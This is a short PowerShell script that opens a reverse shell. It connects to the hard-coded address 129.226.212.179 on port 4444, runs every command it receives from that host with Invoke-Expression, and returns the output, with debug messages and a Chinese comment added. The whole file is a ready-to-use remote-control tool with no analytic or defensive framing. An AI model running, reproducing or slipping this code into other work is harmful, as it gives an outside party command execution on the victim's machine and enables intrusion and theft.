try {
    Write-Output "Attempting to connect to 129.226.212.179:4444"
    $client = New-Object System.Net.Sockets.TCPClient('129.226.212.179',4444);
    if (-not $client.Connected) {
        throw "Failed to connect to the remote host."
    }
    Write-Output "Connection established!"
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};

    # 增加一个等待，确保远程端有时间响应
    Start-Sleep -Seconds 5

    while($true) {
        $i = $stream.Read($bytes, 0, $bytes.Length)
        if ($i -eq 0) {
            Write-Output "No data received, connection may have closed."
            break
        }
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        Write-Output "Received data: $data"
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
} catch {
    Write-Output "Error: $_"
} finally {
    if ($client) { 
        $client.Close(); 
        Write-Output "Connection closed." 
    }
}
